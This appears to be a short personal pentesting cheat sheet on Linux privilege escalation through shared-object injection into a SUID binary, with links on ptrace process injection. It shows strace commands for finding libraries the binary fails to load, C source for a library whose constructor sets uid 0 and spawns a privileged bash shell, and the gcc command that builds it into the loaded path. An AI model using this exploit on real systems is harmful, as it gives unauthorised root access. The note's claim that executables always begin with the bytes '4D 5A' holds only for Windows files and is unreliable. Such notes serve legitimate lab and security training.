see: [[../Buffer Overflow/Cheat Sheet]]

The hex value for an executable is always "4D 5A". 

ptrace injection: http://phrack.org/issues/59/12.html
https://0x00sec.org/t/linux-infecting-running-processes/1097
https://medium.com/@jain.sm/code-injection-in-running-process-using-ptrace-d3ea7191a4be

look what files a binary load

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
ltrace
```



lib code

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```

create binary
```bash
gcc -shared -fPIC /home/user/tools/suid/libcalc.c -o /home/user/.config/libcalc.soÂ 
```
